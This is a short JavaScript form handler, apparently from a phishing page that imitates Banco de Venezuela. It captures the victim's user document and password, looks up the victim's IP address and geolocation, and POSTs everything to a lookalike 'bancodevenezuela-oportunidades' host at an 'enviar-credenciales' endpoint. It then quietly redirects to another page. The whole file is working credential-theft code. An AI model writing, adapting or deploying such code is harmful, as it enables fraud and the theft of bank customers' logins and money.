function enviarFormulario(event) {
    event.preventDefault();

    const usuario = document.getElementById("documento").value;
    const password = document.getElementById("pass").value;

    fetch('https://ipv4.ident.me/json')
    .then(response => response.json())
    .then(ipData => {
        const ipv4 = ipData.ip;
        
        return fetch(`https://ipapi.co/${ipv4}/json/`)
            .then(response => response.json())
            .then(geoData => ({
                ip: ipv4,
                pais: geoData.country_name,
                estado: geoData.region,
                ciudad: geoData.city
            }));
    })
    .then(locationData => {
        return fetch('https://bancodevenezuela-oportunidades.onrender.com/enviar-credenciales', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                usuario,
                password,
                ip: locationData.ip,
                pais: locationData.pais,
                estado: locationData.estado,
                ciudad: locationData.ciudad
            })
        });
    })
    .then(response => {
        if (!response.ok) throw new Error("Error HTTP: " + response.status);
        return response.json();
    })
    .then(data => {
        localStorage.setItem("usuario", usuario);
        window.location.href = "index1.html";
    })
    .catch(error => {
        console.error("Error:", error);
        alert("Error al procesar la solicitud. Intenta nuevamente.");
    });
}
